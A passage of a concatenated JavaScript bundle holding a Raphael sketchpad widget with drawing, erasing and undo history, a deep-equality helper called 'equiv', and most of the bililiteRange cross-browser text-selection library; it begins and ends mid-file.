			return self; // function-chaining
		};

		self.animate = function(ms) {
			if (ms === undefined) {
				ms = 500;
			}

			_paper.clear();

			if (_strokes.length > 0) {
				var i = 0;

				function animate() {
					var stroke = _strokes[i];
					var type = stroke.type;
					_paper[type]()
						.attr(stroke)
						.click(_pathclick);

					i++;
					if (i < _strokes.length) {
						setTimeout(animate, ms);
					}
				};

				animate();
			}

			return self; // function-chaining
		};

		self.editing = function(mode) {
			if (mode === undefined) {
				return _options.editing;
			}

			_options.editing = mode;
			if (_options.editing) {
				if (_options.editing == "erase") {
					// Cursor is crosshair, so it looks like we can do something.
					$(_container).css("cursor", "crosshair");
					$(_container).unbind("mousedown", _mousedown);
					$(_container).unbind("mousemove", _mousemove);
					$(_container).unbind("mouseup", _mouseup);
					$(document).unbind("mouseup", _mouseup);

					// iPhone Events
					var agent = navigator.userAgent;
					if (agent.indexOf("iPhone") > 0 || agent.indexOf("iPod") > 0) {
						$(_container).unbind("touchstart", _touchstart);
						$(_container).unbind("touchmove", _touchmove);
						$(_container).unbind("touchend", _touchend);
					}
				} else {
					// Cursor is crosshair, so it looks like we can do something.
					$(_container).css("cursor", "crosshair");

					$(_container).mousedown(_mousedown);
					$(_container).mousemove(_mousemove);
					$(_container).mouseup(_mouseup);

					// Handle the case when the mouse is released outside the canvas.
					$(document).mouseup(_mouseup);

					// iPhone Events
					var agent = navigator.userAgent;
					if (agent.indexOf("iPhone") > 0 || agent.indexOf("iPod") > 0) {
						$(_container).bind("touchstart", _touchstart);
						$(_container).bind("touchmove", _touchmove);
						$(_container).bind("touchend", _touchend);
					}
				}
			} else {
				// Reverse the settings above.
				$(_container).attr("style", "cursor:default");
				$(_container).unbind("mousedown", _mousedown);
				$(_container).unbind("mousemove", _mousemove);
				$(_container).unbind("mouseup", _mouseup);
				$(document).unbind("mouseup", _mouseup);

				// iPhone Events
				var agent = navigator.userAgent;
				if (agent.indexOf("iPhone") > 0 || agent.indexOf("iPod") > 0) {
					$(_container).unbind("touchstart", _touchstart);
					$(_container).unbind("touchmove", _touchmove);
					$(_container).unbind("touchend", _touchend);
				}
			}

			return self; // function-chaining
		}

		// Change events
		//----------------

		var _change_fn = function() {};
		self.change = function(fn) {
			if (fn == null || fn === undefined) {
				_change_fn = function() {};
			} else if (typeof fn == "function") {
				_change_fn = fn;
			}
		};

		function _fire_change() {
			_change_fn();
		};

		// Miscellaneous methods
		//------------------

		function _redraw_strokes() {
			_paper.clear();

			for (var i = 0, n = _strokes.length; i < n; i++) {
				var stroke = _strokes[i];
				var type = stroke.type;
				_paper[type]()
					.attr(stroke)
					.click(_pathclick);
			}
		};

		function _disable_user_select() {
			$("*").css("-webkit-user-select", "none");
			$("*").css("-moz-user-select", "none");
			if (!!/msie [\w.]+/.exec( navigator.userAgent.toLowerCase() )) {
				$("body").attr("onselectstart", "return false;");
			}
		}

		function _enable_user_select() {
			$("*").css("-webkit-user-select", "text");
			$("*").css("-moz-user-select", "text");
			if (!!/msie [\w.]+/.exec( navigator.userAgent.toLowerCase() )) {
				$("body").removeAttr("onselectstart");
			}
		}

		// Event handlers
		//-----------------
		// We can only attach events to the container, so do it.

		function _pathclick(e) {
			if (_options.editing == "erase") {
				var stroke = this.attr();
				stroke.type = this.type;

				_action_history.add({
					type: "erase",
					stroke: stroke
				});

				for (var i = 0, n = _strokes.length; i < n; i++) {
					var s = _strokes[i];
					if (equiv(s, stroke)) {
						_strokes.splice(i, 1);
					}
				}

				_fire_change();

				this.remove();
			}
		};

		function _mousedown(e) {
			_disable_user_select();

			_pen.start(e, self);
		};

		function _mousemove(e) {
			_pen.move(e, self);
		};

		function _mouseup(e) {
			_enable_user_select();

			var path = _pen.finish(e, self);

			if (path != null) {
				// Add event when clicked.
				path.click(_pathclick);

				// Save the stroke.
				var stroke = path.attr();
				stroke.type = path.type;

				_strokes.push(stroke);

				_action_history.add({
					type: "stroke",
					stroke: stroke
				});

				_fire_change();
			}
		};

		function _touchstart(e) {
			e = e.originalEvent;
			e.preventDefault();

			if (e.touches.length == 1) {
				var touch = e.touches[0];
				_mousedown(touch);
			}
		}

		function _touchmove(e) {
			e = e.originalEvent;
			e.preventDefault();

			if (e.touches.length == 1) {
				var touch = e.touches[0];
				_mousemove(touch);
			}
		}

		function _touchend(e) {
			e = e.originalEvent;
			e.preventDefault();

			_mouseup(e);
		}

		// Setup
		//--------

		var _action_history = new ActionHistory();

		// Path data
		var _strokes = _options.strokes;
		if (jQuery.isArray(_strokes) && _strokes.length > 0) {
			_action_history.add({
				type: "init",
				strokes: jQuery.merge([], _strokes)	// Make a clone.
			});
			_redraw_strokes();
		} else {
			_strokes = [];
			_redraw_strokes();
		}

		self.editing(_options.editing);
	};

	var ActionHistory = function() {
		var self = this;

		var _history = [];

		// Index of the last state.
		var _current_state = -1;

		// Index of the freeze state.
		// The freeze state is the state where actions cannot be undone.
		var _freeze_state = -1;

		// The current set of strokes if strokes were to be rebuilt from history.
		// Set to null to force refresh.
		var _current_strokes = null;

		self.add = function(action) {
			if (_current_state + 1 < _history.length) {
				_history.splice(_current_state + 1, _history.length - (_current_state + 1));
			}

			_history.push(action);
			_current_state = _history.length - 1;

			// Reset current strokes.
			_current_strokes = null;
		};

		self.freeze = function(index) {
			if (index === undefined) {
				_freeze_state = _current_state;
			} else {
				_freeze_state = index;
			}
		};

		self.undoable = function() {
			return (_current_state > -1 && _current_state > _freeze_state);
		};

		self.undo = function() {
			if (self.undoable()) {
				_current_state--;

				// Reset current strokes.
				_current_strokes = null;
			}
		};

		self.redoable = function() {
			return _current_state < _history.length - 1;
		};

		self.redo = function() {
			if (self.redoable()) {
				_current_state++;

				// Reset current strokes.
				_current_strokes = null;
			}
		};

		// Rebuild the strokes from history.
		self.current_strokes = function() {
			if (_current_strokes == null) {
				var strokes = [];
				for (var i = 0; i <= _current_state; i++) {
					var action = _history[i];
					switch(action.type) {
						case "init":
						case "json":
						case "strokes":
						case "batch":
							jQuery.merge(strokes, action.strokes);
							break;
						case "stroke":
							strokes.push(action.stroke);
							break;
						case "erase":
							for (var s = 0, n = strokes.length; s < n; s++) {
								var stroke = strokes[s];
								if (equiv(stroke, action.stroke)) {
									strokes.splice(s, 1);
								}
							}
							break;
						case "clear":
							strokes = [];
							break;
					}
				}

				_current_strokes = strokes;
			}
			return _current_strokes;
		};
	};

	/**
	 * The default Pen object.
	 */
	var Pen = function() {
		var self = this;

		var _color = "#000000";
		var _opacity = 1.0;
		var _width = 5;
		var _offset = null;

		// Drawing state
		var _drawing = false;
		var _c = null;
		var _points = [];

		self.color = function(value) {
			if (value === undefined){
		      	return _color;
		    }

			_color = value;

			return self;
		};

		self.width = function(value) {
			if (value === undefined) {
				return _width;
			}

			if (value < Pen.MIN_WIDTH) {
				value = Pen.MIN_WIDTH;
			} else if (value > Pen.MAX_WIDTH) {
				value = Pen.MAX_WIDTH;
			}

			_width = value;

			return self;
		}

		self.opacity = function(value) {
			if (value === undefined) {
				return _opacity;
			}

			if (value < 0) {
				value = 0;
			} else if (value > 1) {
				value = 1;
			}

			_opacity = value;

			return self;
		}

		self.start = function(e, sketchpad) {
			_drawing = true;

			_offset = $(sketchpad.container()).offset();

			var x = e.pageX - _offset.left,
				y = e.pageY - _offset.top;
			_points.push([x, y]);

			_c = sketchpad.paper().path();

			_c.attr({
				stroke: _color,
				"stroke-opacity": _opacity,
				"stroke-width": _width,
				"stroke-linecap": "round",
				"stroke-linejoin": "round"
			});
		};

		self.finish = function(e, sketchpad) {
			var path = null;

			if (_c != null) {
				if (_points.length <= 1) {
					_c.remove();
				} else {
					path = _c;
				}
			}

			_drawing = false;
			_c = null;
			_points = [];

			return path;
		};

		self.move = function(e, sketchpad) {
			if (_drawing == true) {
				var x = e.pageX - _offset.left,
					y = e.pageY - _offset.top;
				_points.push([x, y]);
				_c.attr({ path: points_to_svg() });
			}
		};

		function points_to_svg() {
			if (_points != null && _points.length > 1) {
				var p = _points[0];
				var path = "M" + p[0] + "," + p[1];
				for (var i = 1, n = _points.length; i < n; i++) {
					p = _points[i];
					path += "L" + p[0] + "," + p[1];
				}
				return path;
			} else {
				return "";
			}
		};
	};

	Pen.MAX_WIDTH = 1000;
	Pen.MIN_WIDTH = 1;

	/**
	 * Utility to generate string representation of an object.
	 */
	function inspect(obj) {
		var str = "";
		for (var i in obj) {
			str += i + "=" + obj[i] + "\n";
		}
		return str;
	}

})(window.Raphael);

Raphael.fn.display = function(elements) {
	for (var i = 0, n = elements.length; i < n; i++) {
		var e = elements[i];
		var type = e.type;
		this[type]().attr(e);
	}
};


/**
 * Utility functions to compare objects by Phil Rathe.
 * http://philrathe.com/projects/equiv
 */

// Determine what is o.
function hoozit(o) {
    if (o.constructor === String) {
        return "string";

    } else if (o.constructor === Boolean) {
        return "boolean";

    } else if (o.constructor === Number) {

        if (isNaN(o)) {
            return "nan";
        } else {
            return "number";
        }

    } else if (typeof o === "undefined") {
        return "undefined";

    // consider: typeof null === object
    } else if (o === null) {
        return "null";

    // consider: typeof [] === object
    } else if (o instanceof Array) {
        return "array";

    // consider: typeof new Date() === object
    } else if (o instanceof Date) {
        return "date";

    // consider: /./ instanceof Object;
    //           /./ instanceof RegExp;
    //          typeof /./ === "function"; // => false in IE and Opera,
    //                                          true in FF and Safari
    } else if (o instanceof RegExp) {
        return "regexp";

    } else if (typeof o === "object") {
        return "object";

    } else if (o instanceof Function) {
        return "function";
    } else {
        return undefined;
    }
}

// Call the o related callback with the given arguments.
function bindCallbacks(o, callbacks, args) {
    var prop = hoozit(o);
    if (prop) {
        if (hoozit(callbacks[prop]) === "function") {
            return callbacks[prop].apply(callbacks, args);
        } else {
            return callbacks[prop]; // or undefined
        }
    }
}

// Test for equality any JavaScript type.
// Discussions and reference: http://philrathe.com/articles/equiv
// Test suites: http://philrathe.com/tests/equiv
// Author: Philippe RathÃ© <prathe@gmail.com>

var equiv = function () {

    var innerEquiv; // the real equiv function
    var callers = []; // stack to decide between skip/abort functions


    var callbacks = function () {

        // for string, boolean, number and null
        function useStrictEquality(b, a) {
            if (b instanceof a.constructor || a instanceof b.constructor) {
                // to catch short annotaion VS 'new' annotation of a declaration
                // e.g. var i = 1;
                //      var j = new Number(1);
                return a == b;
            } else {
                return a === b;
            }
        }

        return {
            "string": useStrictEquality,
            "boolean": useStrictEquality,
            "number": useStrictEquality,
            "null": useStrictEquality,
            "undefined": useStrictEquality,

            "nan": function (b) {
                return isNaN(b);
            },

            "date": function (b, a) {
                return hoozit(b) === "date" && a.valueOf() === b.valueOf();
            },

            "regexp": function (b, a) {
                return hoozit(b) === "regexp" &&
                    a.source === b.source && // the regex itself
                    a.global === b.global && // and its modifers (gmi) ...
                    a.ignoreCase === b.ignoreCase &&
                    a.multiline === b.multiline;
            },

            // - skip when the property is a method of an instance (OOP)
            // - abort otherwise,
            //   initial === would have catch identical references anyway
            "function": function () {
                var caller = callers[callers.length - 1];
                return caller !== Object &&
                        typeof caller !== "undefined";
            },

            "array": function (b, a) {
                var i;
                var len;

                // b could be an object literal here
                if ( ! (hoozit(b) === "array")) {
                    return false;
                }

                len = a.length;
                if (len !== b.length) { // safe and faster
                    return false;
                }
                for (i = 0; i < len; i++) {
                    if( ! innerEquiv(a[i], b[i])) {
                        return false;
                    }
                }
                return true;
            },

            "object": function (b, a) {
                var i;
                var eq = true; // unless we can proove it
                var aProperties = [], bProperties = []; // collection of strings

                // comparing constructors is more strict than using instanceof
                if ( a.constructor !== b.constructor) {
                    return false;
                }

                // stack constructor before traversing properties
                callers.push(a.constructor);

                for (i in a) { // be strict: don't ensures hasOwnProperty and go deep

                    aProperties.push(i); // collect a's properties

                    if ( ! innerEquiv(a[i], b[i])) {
                        eq = false;
                    }
                }

                callers.pop(); // unstack, we are done

                for (i in b) {
                    bProperties.push(i); // collect b's properties
                }

                // Ensures identical properties name
                return eq && innerEquiv(aProperties.sort(), bProperties.sort());
            }
        };
    }();

    innerEquiv = function () { // can take multiple arguments
        var args = Array.prototype.slice.apply(arguments);
        if (args.length < 2) {
            return true; // end transition
        }

        return (function (a, b) {
            if (a === b) {
                return true; // catch the most you can
            } else if (a === null || b === null || typeof a === "undefined" || typeof b === "undefined" || hoozit(a) !== hoozit(b)) {
                return false; // don't lose time with error prone cases
            } else {
                return bindCallbacks(a, callbacks, [b, a]);
            }

        // apply transition with (1..n) arguments
        })(args[0], args[1]) && arguments.callee.apply(this, args.splice(1, args.length -1));
    };

    return innerEquiv;

}();







// Cross-broswer implementation of text ranges and selections
// documentation: http://bililite.com/blog/2011/01/17/cross-browser-text-ranges-and-selections/
// Version: 2.6
// Copyright (c) 2013 Daniel Wachsstock
// MIT license:
// Permission is hereby granted, free of charge, to any person
// obtaining a copy of this software and associated documentation
// files (the "Software"), to deal in the Software without
// restriction, including without limitation the rights to use,
// copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following
// conditions:

// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
// OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
// HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
// WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
// OTHER DEALINGS IN THE SOFTWARE.

(function(){

// a bit of weirdness with IE11: using 'focus' is flaky, even if I'm not bubbling, as far as I can tell.
var focusEvent = 'onfocusin' in document.createElement('input') ? 'focusin' : 'focus';

// IE11 normalize is buggy (http://connect.microsoft.com/IE/feedback/details/809424/node-normalize-removes-text-if-dashes-are-present)
var n = document.createElement('div');
n.appendChild(document.createTextNode('x-'));
n.appendChild(document.createTextNode('x'));
n.normalize();
var canNormalize = n.firstChild.length == 3;


bililiteRange = function(el, debug){
	var ret;
	if (debug){
		ret = new NothingRange(); // Easier to force it to use the no-selection type than to try to find an old browser
	}else if (window.getSelection && el.setSelectionRange){
		// Standards. Element is an input or textarea
		// note that some input elements do not allow selections
		try{
			el.selectionStart; // even getting the selection in such an element will throw
			ret = new InputRange();
		}catch(e){
			ret = new NothingRange();
		}
	}else if (window.getSelection){
		// Standards, with any other kind of element
		ret = new W3CRange();
	}else if (document.selection){
		// Internet Explorer
		ret = new IERange();
	}else{
		// doesn't support selection
		ret = new NothingRange();
	}
	ret._el = el;
	// determine parent document, as implemented by John McLear <john@mclear.co.uk>
	ret._doc = el.ownerDocument;
	ret._win = 'defaultView' in ret._doc ? ret._doc.defaultView : ret._doc.parentWindow;
	ret._textProp = textProp(el);
	ret._bounds = [0, ret.length()];
	//  There's no way to detect whether a focus event happened as a result of a click (which should change the selection)
	// or as a result of a keyboard event (a tab in) or a script  action (el.focus()). So we track it globally, which is a hack, and is likely to fail
	// in edge cases (right-clicks, drag-n-drop), and is vulnerable to a lower-down handler preventing bubbling.
	// I just don't know a better way.
	// I'll hack my event-listening code below, rather than create an entire new bilililiteRange, potentially before the DOM has loaded
	if (!('bililiteRangeMouseDown' in ret._doc)){
		var _doc = {_el: ret._doc};
		ret._doc.bililiteRangeMouseDown = false;
		bililiteRange.fn.listen.call(_doc, 'mousedown', function() {
			ret._doc.bililiteRangeMouseDown = true;
		});
		bililiteRange.fn.listen.call(_doc, 'mouseup', function() {
			ret._doc.bililiteRangeMouseDown = false;
		});
	}
	// note that bililiteRangeSelection is an array, which means that copying it only copies the address, which points to the original.
	// make sure that we never let it (always do return [bililiteRangeSelection[0], bililiteRangeSelection[1]]), which means never returning
	// this._bounds directly
	if (!('bililiteRangeSelection' in el)){
		// start tracking the selection
		function trackSelection(evt){
			if (evt && evt.which == 9){
				// do tabs my way, by restoring the selection
				// there's a flash of the browser's selection, but I don't see a way of avoiding that
				ret._nativeSelect(ret._nativeRange(el.bililiteRangeSelection));
			}else{
				el.bililiteRangeSelection = ret._nativeSelection();
			}
		}
		trackSelection();
		// only IE does this right and allows us to grab the selection before blurring
		if ('onbeforedeactivate' in el){
			ret.listen('beforedeactivate', trackSelection);
		}else{
			// with standards-based browsers, have to listen for every user interaction
			ret.listen('mouseup', trackSelection).listen('keyup', trackSelection);
		}
		ret.listen(focusEvent, function(){
			// restore the correct selection when the element comes into focus (mouse clicks change the position of the selection)
			// Note that Firefox will not fire the focus event until the window/tab is active even if el.focus() is called
			// https://bugzilla.mozilla.org/show_bug.cgi?id=566671
			if (!ret._doc.bililiteRangeMouseDown){
				ret._nativeSelect(ret._nativeRange(el.bililiteRangeSelection));
			}
		});
	}
	if (!('oninput' in el)){
		// give IE8 a chance. Note that this still fails in IE11, which has has oninput on contenteditable elements but does not
		// dispatch input events. See http://connect.microsoft.com/IE/feedback/details/794285/ie10-11-input-event-does-not-fire-on-div-with-contenteditable-set
		// TODO: revisit this when I have IE11 running on my development machine
		// TODO: FIXED

		var inputhack = function() {ret.dispatch({type: 'input', bubbles: true}) };

		if(typeof window.setTimeout == 'object'){ /* IE 8 sees `setTimeout` as an `object` and not a `function` */

			ret.listen('keyup', inputhack);
			ret.listen('cut', inputhack);
			ret.listen('paste', inputhack);
			ret.listen('drop', inputhack);
			el.oninput = 'patched';

		}
	}else{

		/*
			IE9/IE11 supports the `textinput` event (even on contenteditable elements)

			See http://help.dottoro.com/ljhiwalm.php
		*/

		/* Detect IE 9/11, See: https://stackoverflow.com/questions/21825157/internet-explorer-11-detection  */

		if((!(window.FileReader) || !!window.MSInputMethodContext) && !!document.documentMode){

			ret.listen('textinput', function(){ ret.dispatch({type: 'input', bubbles: true}); });

		}
	}
	return ret;
}

function textProp(el){
	// returns the property that contains the text of the element
	// note that for <body> elements the text attribute represents the obsolete text color, not the textContent.
	// we document that these routines do not work for <body> elements so that should not be relevant

	// Bugfix for https://github.com/dwachss/bililiteRange/issues/18
	// Adding typeof check of string for el.value in case for li elements
	if (typeof el.value === 'string') return 'value';
	if (typeof el.text != 'undefined') return 'text';
	if (typeof el.textContent != 'undefined') return 'textContent';
	return 'innerText';
}

// base class
function Range(){}
Range.prototype = {
	length: function() {
		return this._el[this._textProp].replace(/\r/g, '').length; // need to correct for IE's CrLf weirdness
	},
	bounds: function(s){
		if (bililiteRange.bounds[s]){
			this._bounds = bililiteRange.bounds[s].apply(this);
		}else if (s){
			this._bounds = s; // don't do error checking now; things may change at a moment's notice
		}else{
			var b = [
				Math.max(0, Math.min (this.length(), this._bounds[0])),
				Math.max(0, Math.min (this.length(), this._bounds[1]))
			];
			b[1] = Math.max(b[0], b[1]);
			return b; // need to constrain it to fit
		}
		return this; // allow for chaining
	},
	select: function(){
		var b = this._el.bililiteRangeSelection = this.bounds();
		if (this._el === this._doc.activeElement){
			// only actually select if this element is active!
			this._nativeSelect(this._nativeRange(b));
		}
		this.dispatch({type: 'select', bubbles: true});
		return this; // allow for chaining
	},
	text: function(text, select){
		if (arguments.length){
			var bounds = this.bounds(), el = this._el;
			// signal the input per DOM 3 input events, http://www.w3.org/TR/DOM-Level-3-Events/#h4_events-inputevents
			// we add another field, bounds, which are the bounds of the original text before being changed.
			this.dispatch({type: 'beforeinput', bubbles: true,
			               data: text, bounds: bounds});
			this._nativeSetText(text, this._nativeRange(bounds));
			if (select == 'start'){
				this.bounds ([bounds[0], bounds[0]]);
			}else if (select == 'end'){
				this.bounds ([bounds[0]+text.length, bounds[0]+text.length]);
			}else if (select == 'all'){
				this.bounds ([bounds[0], bounds[0]+text.length]);
			}
			this.dispatch({type: 'input', bubbles: true,
			               data: text, bounds: bounds});
			return this; // allow for chaining
		}else{
			return this._nativeGetText(this._nativeRange(this.bounds())).replace(/\r/g, ''); // need to correct for IE's CrLf weirdness
		}
	},
	insertEOL: function (){
		this._nativeEOL();
		this._bounds = [this._bounds[0]+1, this._bounds[0]+1]; // move past the EOL marker
		return this;
	},
	sendkeys: function (text){
		var self = this;
		this.data().sendkeysOriginalText = this.text();
		this.data().sendkeysBounds = undefined;
		function simplechar (rng, c){
			if (/^{[^}]*}$/.test(c)) c = c.slice(1,-1);	// deal with unknown {key}s
			for (var i =0; i < c.length; ++i){
				var x = c.charCodeAt(i);
				rng.dispatch({type: 'keypress', bubbles: true, keyCode: x, which: x, charCode: x});
			}
			rng.text(c, 'end');
		}
		text.replace(/{[^}]*}|[^{]+|{/g, function(part){
			(bililiteRange.sendkeys[part] || simplechar)(self, part, simplechar);
		});
		this.bounds(this.data().sendkeysBounds);
		this.dispatch({type: 'sendkeys', which: text});
		return this;
	},
	top: function(){
		return this._nativeTop(this._nativeRange(this.bounds()));
	},
	scrollIntoView: function(scroller){

		var top = this.top();
		// scroll into position if necessary
		if (this._el.scrollTop > top || this._el.scrollTop+this._el.clientHeight < top){
			if (scroller){
				scroller.call(this._el, top);
			}else{
				this._el.scrollTop = top;
			}
		}
		return this;
	},
	wrap: function (n){
		this._nativeWrap(n, this._nativeRange(this.bounds()));
		return this;
	},
	selection: function(text){
		if (arguments.length){
			return this.bounds('selection').text(text, 'end').select();
		}else{
			return this.bounds('selection').text();
		}
	},
	clone: function(){
		return bililiteRange(this._el).bounds(this.bounds());
	},
	all: function(text){
		if (arguments.length){
			this.dispatch ({type: 'beforeinput', bubbles: true, data: text});
			this._el[this._textProp] = text;
			this.dispatch ({type: 'input', bubbles: true, data: text});
			return this;
		}else{
			return this._el[this._textProp].replace(/\r/g, ''); // need to correct for IE's CrLf weirdness
		}
	},
	element: function() { return this._el },
	// includes a quickie polyfill for CustomEvent for IE that isn't perfect but works for me
	// IE10 allows custom events but not "new CustomEvent"; have to do it the old-fashioned way
	dispatch: function(opts){
		opts = opts || {};
		var event = document.createEvent ? document.createEvent('CustomEvent') : this._doc.createEventObject();
		event.initCustomEvent && event.initCustomEvent(opts.type, !!opts.bubbles, !!opts.cancelable, opts.detail);
		for (var key in opts) event[key] = opts[key];
		// dispatch event asynchronously (in the sense of on the next turn of the event loop; still should be fired in order of dispatch
		var el = this._el;
		setTimeout(function(){
			try {
				el.dispatchEvent ? el.dispatchEvent(event) : el.fireEvent("on" + opts.type, document.createEventObject());
				}catch(e){
				// IE8 will not let me fire custom events at all. Call them directly
					var listeners = el['listen'+opts.type];
					if (listeners) for (var i = 0; i < listeners.length; ++i){
						listeners[i].call(el, event);
					}
				}
		}, 0);
		return this;
	},
	listen: function (type, func){
		var el = this._el;
		if (el.addEventListener){
			el.addEventListener(type, func);
		}else{
			el.attachEvent("on" + type, func);
			// IE8 can't even handle custom events created with createEventObject  (though it permits attachEvent), so we have to make our own
			var listeners = el['listen'+type] = el['listen'+type] || [];
			listeners.push(func);
		}
		return this;
	},
	dontlisten: function (type, func){
		var el = this._el;
		if (el.removeEventListener){
			el.removeEventListener(type, func);
		}else try{
			el.detachEvent("on" + type, func);
		}catch(e){
			var listeners = el['listen'+type];
			if (listeners) for (var i = 0; i < listeners.length; ++i){
				if (listeners[i] === func) listeners[i] = function(){}; // replace with a noop
			}
		}
		return this;
	}
};

// allow extensions ala jQuery
bililiteRange.fn = Range.prototype; // to allow monkey patching
bililiteRange.extend = function(fns){
	for (fn in fns) Range.prototype[fn] = fns[fn];
};

//bounds functions
bililiteRange.bounds = {
	all: function() { return [0, this.length()] },
	start: function () { return [0,0] },
	end: function () { return [this.length(), this.length()] },
	selection: function(){
		if (this._el === this._doc.activeElement){
			this.bounds ('all'); // first select the whole thing for constraining
			return this._nativeSelection();
		}else{
			return this._el.bililiteRangeSelection;
		}
	}
};

// sendkeys functions
bililiteRange.sendkeys = {
	'{enter}': function (rng){
		rng.dispatch({type: 'keypress', bubbles: true, keyCode: '\n', which: '\n', charCode: '\n'});
		rng.insertEOL();
	},
	'{tab}': function (rng, c, simplechar){
		simplechar(rng, '\t'); // useful for inserting what would be whitespace
	},
	'{newline}': function (rng, c, simplechar){
		simplechar(rng, '\n'); // useful for inserting what would be whitespace (and if I don't want to use insertEOL, which does some fancy things)
	},
	'{backspace}': function (rng){
		var b = rng.bounds();
		if (b[0] == b[1]) rng.bounds([b[0]-1, b[0]]); // no characters selected; it's just an insertion point. Remove the previous character
		rng.text('', 'end'); // delete the characters and update the selection
	},
	'{del}': function (rng){
		var b = rng.bounds();
		if (b[0] == b[1]) rng.bounds([b[0], b[0]+1]); // no characters selected; it's just an insertion point. Remove the next character
		rng.text('', 'end'); // delete the characters and update the selection
	},
	'{rightarrow}':  function (rng){
		var b = rng.bounds();
		if (b[0] == b[1]) ++b[1]; // no characters selected; it's just an insertion point. Move to the right
		rng.bounds([b[1], b[1]]);
	},
	'{leftarrow}': function (rng){
		var b = rng.bounds();
		if (b[0] == b[1]) --b[0]; // no characters selected; it's just an insertion point. Move to the left
		rng.bounds([b[0], b[0]]);
	},
	'{selectall}' : function (rng){
		rng.bounds('all');
	},
	'{selection}': function (rng){
		// insert the characters without the sendkeys processing
		var s = rng.data().sendkeysOriginalText;
		for (var i =0; i < s.length; ++i){
			var x = s.charCodeAt(i);
			rng.dispatch({type: 'keypress', bubbles: true, keyCode: x, which: x, charCode: x});
		}
		rng.text(s, 'end');
	},
	'{mark}' : function (rng){
		rng.data().sendkeysBounds = rng.bounds();
	}
};
// Synonyms from the proposed DOM standard (http://www.w3.org/TR/DOM-Level-3-Events-key/)
bililiteRange.sendkeys['{Enter}'] = bililiteRange.sendkeys['{enter}'];
bililiteRange.sendkeys['{Backspace}'] = bililiteRange.sendkeys['{backspace}'];
bililiteRange.sendkeys['{Delete}'] = bililiteRange.sendkeys['{del}'];
bililiteRange.sendkeys['{ArrowRight}'] = bililiteRange.sendkeys['{rightarrow}'];
bililiteRange.sendkeys['{ArrowLeft}'] = bililiteRange.sendkeys['{leftarrow}'];

function IERange(){}
IERange.prototype = new Range();
IERange.prototype._nativeRange = function (bounds){
	var rng;
	if (this._el.tagName == 'INPUT'){
		// IE 8 is very inconsistent; textareas have createTextRange but it doesn't work
		rng = this._el.createTextRange();
	}else{
		rng = this._doc.body.createTextRange ();
		rng.moveToElementText(this._el);
	}
	if (bounds){
		if (bounds[1] < 0) bounds[1] = 0; // IE tends to run elements out of bounds
		if (bounds[0] > this.length()) bounds[0] = this.length();
		if (bounds[1] < rng.text.replace(/\r/g, '').length){ // correct for IE's CrLf weirdness
			// block-display elements have an invisible, uncounted end of element marker, so we move an extra one and use the current length of the range
			rng.moveEnd ('character', -1);
			rng.moveEnd ('character', bounds[1]-rng.text.replace(/\r/g, '').length);
		}
		if (bounds[0] > 0) rng.moveStart('character', bounds[0]);
	}
	return rng;
};
IERange.prototype._nativeSelect = function (rng){
	rng.select();
};
IERange.prototype._nativeSelection = function (){
	// returns [start, end] for the selection constrained to be in element
	var rng = this._nativeRange(); // range of the element to constrain to
	var len = this.length();
	var sel = this._doc.selection.createRange();
	try{
		return [
			iestart(sel, rng),
			ieend (sel, rng)
		];
	}catch (e){
		// TODO: determine if this is still necessary, since we only call _nativeSelection if _el is active
		// IE gets upset sometimes about comparing text to input elements, but the selections cannot overlap, so make a best guess
		return (sel.parentElement().sourceIndex < this._el.sourceIndex) ? [0,0] : [len, len];
	}
};
IERange.prototype._nativeGetText = function (rng){
	return rng.text;
};
IERange.prototype._nativeSetText = function (text, rng){
	rng.text = text;
};
IERange.prototype._nativeEOL = function(){
	if ('value' in this._el){
		this.text('\n'); // for input and textarea, insert it straight
	}else{
		this._nativeRange(this.bounds()).pasteHTML('\n<br/>');
	}
};
IERange.prototype._nativeTop = function(rng){
	var startrng = this._nativeRange([0,0]);
	return rng.boundingTop - startrng.boundingTop;
}
IERange.prototype._nativeWrap = function(n, rng) {
	// hacky to use string manipulation but I don't see another way to do it.
	var div = document.createElement('div');
	div.appendChild(n);
	// insert the existing range HTML after the first tag
	var html = div.innerHTML.replace('><', '>'+rng.htmlText+'<');
	rng.pasteHTML(html);
};

// IE internals
function iestart(rng, constraint){
	// returns the position (in character) of the start of rng within constraint. If it's not in constraint, returns 0 if it's before, length if it's after
	var len = constraint.text.replace(/\r/g, '').length; // correct for IE's CrLf weirdness
	if (rng.compareEndPoints ('StartToStart', constraint) <= 0) return 0; // at or before the beginning
	if (rng.compareEndPoints ('StartToEnd', constraint) >= 0) return len;
	for (var i = 0; rng.compareEndPoints ('StartToStart', constraint) > 0; ++i, rng.moveStart('character', -1));
	return i;
}
function ieend (rng, constraint){
	// returns the position (in character) of the end of rng within constraint. If it's not in constraint, returns 0 if it's before, length if it's after
	var len = constraint.text.replace(/\r/g, '').length; // correct for IE's CrLf weirdness
	if (rng.compareEndPoints ('EndToEnd', constraint) >= 0) return len; // at or after the end
	if (rng.compareEndPoints ('EndToStart', constraint) <= 0) return 0;
	for (var i = 0; rng.compareEndPoints ('EndToStart', constraint) > 0; ++i, rng.moveEnd('character', -1));
	return i;
}

// an input element in a standards document. "Native Range" is just the bounds array
function InputRange(){}
InputRange.prototype = new Range();
InputRange.prototype._nativeRange = function(bounds) {
	return bounds || [0, this.length()];
};
InputRange.prototype._nativeSelect = function (rng){
	this._el.setSelectionRange(rng[0], rng[1]);
};
InputRange.prototype._nativeSelection = function(){
	return [this._el.selectionStart, this._el.selectionEnd];
};
InputRange.prototype._nativeGetText = function(rng){
	return this._el.value.substring(rng[0], rng[1]);
};
InputRange.prototype._nativeSetText = function(text, rng){
	var val = this._el.value;
	this._el.value = val.substring(0, rng[0]) + text + val.substring(rng[1]);
};
InputRange.prototype._nativeEOL = function(){
	this.text('\n');
};
InputRange.prototype._nativeTop = function(rng){
	// I can't remember where I found this clever hack to find the location of text in a text area
	var clone = this._el.cloneNode(true);
